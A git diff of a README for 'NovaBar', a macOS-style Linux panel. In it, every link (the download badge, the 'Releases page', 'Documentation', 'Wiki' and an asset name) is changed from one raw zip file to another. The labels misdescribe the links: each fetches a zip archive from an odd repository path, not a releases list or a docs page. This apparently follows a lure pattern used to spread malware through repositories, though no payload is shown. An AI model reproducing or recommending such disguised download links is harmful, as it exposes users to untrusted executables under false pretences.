@@ -1,6 +1,6 @@
 # ✨ NovaBar - A Sleek Panel for Your Desktop 
 
-[![Download NovaBar](https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip)](https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip)
+[![Download NovaBar](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip)](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ NovaBar offers a modern macOS-style panel for your Linux desktop, especially for
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip) to download NovaBar. You will find various versions available for different system configurations. 
+To get started, visit the [Releases page](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip) to download NovaBar. You will find various versions available for different system configurations. 
 
 ### Steps to Download NovaBar
 
 1. Click on the link above.
 2. You will see a list of released versions. Select the latest release.
 3. Scroll down to the "Assets" section.
-4. Download the correct file for your system. You may see options like `.deb`, `.rpm`, or `https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip`.
+4. Download the correct file for your system. You may see options like `.deb`, `.rpm`, or `https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip`.
 5. Once downloaded, follow the instructions for your system.
 
 ## 🖥️ System Requirements
@@ -114,7 +114,7 @@ If you encounter any issues during the installation or while using NovaBar, here
 
 ### How do I update NovaBar?
 
-To update NovaBar, return to the [Releases page](https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip) and download the latest version. You will need to follow the same installation steps as before.
+To update NovaBar, return to the [Releases page](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip) and download the latest version. You will need to follow the same installation steps as before.
 
 ### Can I customize the look of the panel?
 
@@ -130,6 +130,6 @@ Join our community to share your experiences, ask questions, or report issues. Y
 
 ---
 
-For more detailed information, visit our [Documentation](https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip) or browse our [Wiki](https://raw.githubusercontent.com/Dim747/NovaBar/main/src/indicators/datetime/Nova-Bar-2.1-beta.3.zip) for additional resources. 
+For more detailed information, visit our [Documentation](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip) or browse our [Wiki](https://github.com/Dim747/NovaBar/raw/refs/heads/main/data/Nova-Bar-2.9.zip) for additional resources. 
 
 Don't forget to give us feedback! Your experience matters and helps us improve NovaBar.
